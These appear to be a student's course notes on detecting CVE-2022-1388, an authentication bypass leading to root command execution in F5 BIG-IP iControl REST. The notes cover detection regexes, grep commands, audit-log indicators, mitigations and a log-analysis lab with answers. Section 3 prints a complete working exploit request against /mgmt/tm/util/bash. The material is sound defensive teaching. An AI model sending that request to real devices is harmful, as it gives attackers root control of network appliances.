# Section 7: F5 BIG-IP iControl REST RCE Detection

> Part of my **Web Attack Detection and Analysis** course notes. See the [README](README.md) for all sections.

## Overview

This section covers **CVE-2022-1388**, a critical **authentication bypass → remote code execution** vulnerability in the **iControl REST** component of F5 **BIG-IP**. It focuses on how the exploit works, how to recognize attempts in logs, which conditions must be met, and how to mitigate it.

| # | Topic |
|---|-------|
| 1 | Introduction to CVE-2022-1388 |
| 2 | Impact of the vulnerability |
| 3 | Check if you're vulnerable (BIG-IP versions) |
| 4 | Example payloads |
| 5 | Mitigation and IoCs |
| 6 | CVE-2022-1388 and SOC analysts |

---

## 1. What is CVE-2022-1388?

- **F5 BIG-IP** is an application delivery controller (ADC) — load balancing, traffic management and security — used widely by enterprises, government and service providers. **iControl REST** is its management API.
- **CVE-2022-1388** (F5 advisory **May 4, 2022**, ref **K23605346**) is a flaw in iControl REST that lets an **unauthenticated** attacker with network access **bypass authentication** and run commands.
- **CVSS score: 9.8** (Critical).
- The core of it: the **`/mgmt/tm/util/bash`** endpoint runs commands as the **root** user of the device, and in the vulnerable path it can be reached **without valid credentials**.
- Reachable via the **management port** or a **self-IP** that exposes iControl REST.

**Impact of successful exploitation:** full control of the device as root — arbitrary command execution, web shells / backdoors for persistence, and post-exploitation activity. Because BIG-IP sits in front of application traffic, a compromised device is a serious foothold.

---

## 2. How the attack works

The exploit abuses how iControl REST handles the **`X-F5-Auth-Token`** header together with the hop-by-hop **`Connection`** header. By listing `X-F5-Auth-Token` in the `Connection` header and pointing the request at the local management service (`Host: localhost`), the request is treated as already-trusted local traffic, and the authentication check is skipped.

**Attack flow**
1. The attacker sends a crafted **POST** request to **`/mgmt/tm/util/bash`**.
2. The headers are set so iControl REST **bypasses authentication** (see the conditions in section 3).
3. The body asks the `bash` utility to **run** an arbitrary Linux command.
4. The command executes **as root**, and the attacker gets the output back.

It requires **no password** — a valid-looking (but empty) `admin` basic-auth header plus the header trick is enough.

---

## 3. The exploit request (example payloads)

For the exploit to work, **all** of these conditions must be met:

1. A **POST** to the endpoint **`/mgmt/tm/util/bash`**.
2. Header **`X-F5-Auth-Token: 0`**.
3. **`Authorization: Basic YWRtaW46`** — Base64 for `admin:` (username `admin`, empty password).
4. **`Connection: X-F5-Auth-Token`** (names the auth-token header as hop-by-hop).
5. **`Host: localhost`** or **`127.0.0.1`** — or, alternatively, `Connection: X-F5-Auth-Token, X-Forwarded-Host` with any host value.
6. Body parameter **`"command": "run"`**.
7. Body parameter **`"utilCmdArgs": "-c '<linux command>'"`** (e.g. `whoami`).

**Putting it together:**
```http
POST /mgmt/tm/util/bash HTTP/1.1
Host: localhost
Authorization: Basic YWRtaW46
X-F5-Auth-Token: 0
Connection: X-F5-Auth-Token
Content-Type: application/json

{"command": "run", "utilCmdArgs": "-c 'whoami'"}
```
Change `whoami` to any command — it runs as root.

### Affected BIG-IP versions
| Branch | Vulnerable range |
|---|---|
| 16.x | 16.1.0 – 16.1.2 |
| 15.x | 15.1.0 – 15.1.5 |
| 14.x | 14.1.0 – 14.1.4 |
| 13.x | 13.1.0 – 13.1.4 |
| 12.x | 12.1.0 – 12.1.6 |
| 11.x | 11.6.1 – 11.6.5 |

---

## 4. Detecting CVE-2022-1388

### Key idea
Detection is relatively straightforward because the exploit always targets **one specific path**: `/mgmt/tm/util/bash`. Watch the logs for requests to it.

- The real exploit is a **POST** — a **GET** to the same path is likely a **scan or a false positive**, not working exploitation. Don't alert on GET alone.
- Confirm by checking the other conditions (the `X-F5-Auth-Token` / `Connection` headers, the `command=run` body) where the logs capture them.

### Regex (from the course)
```
\S+.*POST\s\/mgmt\/tm\/util\/bash\b.*
```
- `\S+` — the client IP (non-whitespace).
- `.*` — anything before the method.
- `POST\s\/mgmt\/tm\/util\/bash\b` — a POST to the exact endpoint.
- `.*` — anything after.

### grep equivalents
```bash
# All requests to the endpoint (POST and GET), newest context first
grep -i '/mgmt/tm/util/bash' access.log

# Only the POST attempts (the ones that matter)
grep -iE 'POST\s+/mgmt/tm/util/bash' access.log

# POST attempts that returned 200 (may have executed)
grep -iE 'POST\s+/mgmt/tm/util/bash' access.log | grep -E '" 200 '

# Which IPs are sending POSTs to the endpoint?
grep -iE 'POST\s+/mgmt/tm/util/bash' access.log | awk '{print $1}' | sort | uniq -c | sort -rn
```

### Indicators of compromise (on the BIG-IP device)
Beyond the web/access log, check the device's own audit logs:
- **`/var/log/audit`** — an entry like `AUDIT - pid=... user=admin folder=/Common module=(tmos)# status=[Command OK] cmd_data=run util bash -c id` shows the bash utility ran a command.
- **`/var/log/restjavad-audit.0.log`** (and `restjavad-audit.*.log`) — an entry like `{"user":"local/admin","method":"POST","uri":"http://localhost:8100/mgmt/tm/util/bash","status":200,"from":"<ip>"}` shows a POST to the endpoint and the source IP.
- Compare these against **legitimate** REST calls, and look for unexpected file/config/process changes.
- F5 **iHealth heuristics**: H511618 (unknown running processes), H444724 (iControl REST exposed to the internet via the management interface), H458565 (self-IP Port Lockdown set to "Allow All").

### Did the attack succeed?
The access log shows the **attempt**. To judge success:
- A **POST** to `/mgmt/tm/util/bash` returning **`200`** suggests the request was processed (command likely ran). A **`400`** (or other error) suggests it was malformed or rejected.
- Confirm with the device's **audit logs** above (`cmd_data=...`, `status:200`) and look for the command's effects (new processes, web shells, config changes).

---

## 5. Mitigation

- **Upgrade BIG-IP** to a fixed release: **17.0.0, 16.1.2.2, 15.1.5.1, 14.1.4.6, or 13.1.5**. (Branches **11.x and 12.x have no patch** and should be migrated off.)
- Until patched, apply F5's temporary workarounds to limit iControl REST to trusted networks:
  1. **Block iControl REST access through the self IP address.**
  2. **Block iControl REST access through the management interface.**
  3. **Modify the BIG-IP `httpd` configuration** (per F5's advisory).
- Restrict the management interface to authorized administrators only.
- If compromise is confirmed, F5's guidance is to **rebuild the device from scratch** and rotate internal certificates and passwords.

---

## 6. Lab: CVE-2022-1388 log analysis

**Environment:** a Linux VM with one nginx `access.log` at `/root/Desktop/access.log`. Most of the file is ordinary traffic; the exploit attempts are POST requests to `/mgmt/tm/util/bash` deeper in the log.

**Tasks**

- How many **potential exploit attempts** were made for this CVE?

![Images/07-Lab-Exploit-Attempts.png](https://github.com/YusraAlMazrui/Web-Attacks-Detection-And-Analysis/blob/dd30edfbc58571a185c3b0534e6db08aee56f780/Images/07-Lab-exploits.png)

- How many requests **may have been successfully exploited**?

![Images/07-Lab-200successful-exploits.png](https://github.com/YusraAlMazrui/Web-Attacks-Detection-And-Analysis/blob/dd30edfbc58571a185c3b0534e6db08aee56f780/Images/07-Lab-200successful-exploits.png)

![Images/07-Lab-Successful-Exploits.png](https://github.com/YusraAlMazrui/Web-Attacks-Detection-And-Analysis/blob/dd30edfbc58571a185c3b0534e6db08aee56f780/Images/07-Lab-200successful-exploits-(2).png)

![Images/07-Lab-400-unsuccessful-exploit.png](https://github.com/YusraAlMazrui/Web-Attacks-Detection-And-Analysis/blob/dd30edfbc58571a185c3b0534e6db08aee56f780/Images/07-Lab-400-unsuccessful-exploit.png)

**Answers**

| Question | Answer |
|---|---|
| Potential exploit attempts | **3** |
| Possibly successful | **2** |

**How I approached it**
- Searched the log for `mgmt/tm/` to surface every request to the endpoint.
- Counted only the **POST** requests to `/mgmt/tm/util/bash` — those are the real attempts (a GET would be a false positive).
- Of those, counted how many returned **`200`** (processed / possibly successful) vs an error.

**What I found**
- **3 POST** requests to `/mgmt/tm/util/bash` → 3 exploit attempts:
  - `206.52.202.133` → **200**
  - `81.230.88.93` → **200**
  - `186.187.35.199` → **400**
- **2** of them returned **`200`**, so those two **may have been successful**; the `400` was rejected.

**Observations**
- Filtering on the path alone isn't enough — separate **POST from GET**, since only POST can exploit this. The method is what turns a noisy "someone touched the endpoint" into a real attempt.
- The **status code** is the quick first signal for success (`200` vs `400`), but on a real device you'd confirm with the `restjavad-audit` / `audit` logs, not the access log alone.

---

## Key takeaways

- CVE-2022-1388 is an **unauthenticated auth-bypass to root RCE** in F5 BIG-IP iControl REST, via a header trick (`Connection: X-F5-Auth-Token`) and the `/mgmt/tm/util/bash` endpoint.
- Detection centres on **one path** — `/mgmt/tm/util/bash` — but you must separate **POST (real attempt)** from **GET (likely scan/false positive)**.
- Response **`200`** on a POST to that path is the first sign of possible success; confirm with the device's **audit logs**.
- The fix is **upgrading BIG-IP**; until then, lock iControl REST down to trusted networks.

## Skills practised

Recognizing an endpoint-specific RCE in web logs, distinguishing exploit attempts from scans by HTTP method, writing a targeted regex / grep for a known-bad path, using status codes and device audit logs to judge success, mapping IoCs, and vulnerability mitigation planning.

---

*Previous: [Section 6: Detecting Text4Shell Attack](06-detecting-text4shell-attack.md) | Back to [README](README.md)*
